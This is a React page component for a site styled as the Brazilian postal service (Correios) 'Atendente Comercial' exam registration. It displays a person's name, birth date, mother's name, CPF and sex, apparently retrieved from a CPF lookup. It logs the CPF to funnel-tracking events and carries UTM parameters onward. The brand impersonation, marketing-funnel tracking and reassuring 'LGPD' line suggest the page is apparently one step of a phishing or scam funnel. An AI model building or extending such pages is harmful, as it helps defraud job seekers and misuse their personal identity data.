import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const ConfirmaDados = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const cepData = location.state?.cepData;

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: "/confirma-dados", cepData });
    trackFunnelEvent('confirma-dados', { cpf: cpfData.cpf });
    window.scrollTo(0, 0);
  }, [cpfData, navigate]);

  const handleConfirmar = () => {
    navigate(buildUrlWithUtm("/detalhes-inscricao"), { state: { cpfData, cepData } });
  };

  const handleCorrigir = () => { clearSession(); navigate("/"); };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Atendente Comercial > Inscrição > Confirmação" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">CONFIRMAÇÃO DE DADOS DO CANDIDATO</h1>
          <p className="text-sm text-muted-foreground">
            Verifique se as informações abaixo estão corretas antes de prosseguir.
          </p>

          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Nome completo</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">Data de nascimento</td><td>{cpfData.dataNascimento}</td></tr>
              {cpfData.nomeMae && <tr><td className="font-semibold">Nome da mãe</td><td>{cpfData.nomeMae}</td></tr>}
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
              <tr><td className="font-semibold">Sexo</td><td>{cpfData.sexo}</td></tr>
            </tbody>
          </table>

          <div className="space-y-3">
            <Button onClick={handleConfirmar} className="w-full h-12 text-sm font-bold">
              Confirmar dados
            </Button>
            <Button onClick={handleCorrigir} variant="outline" className="w-full h-10 text-sm font-semibold">
              Não sou eu, corrigir dados
            </Button>
          </div>

          <p className="text-[10px] text-center text-muted-foreground">
            Dados consultados de forma segura — LGPD
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default ConfirmaDados;
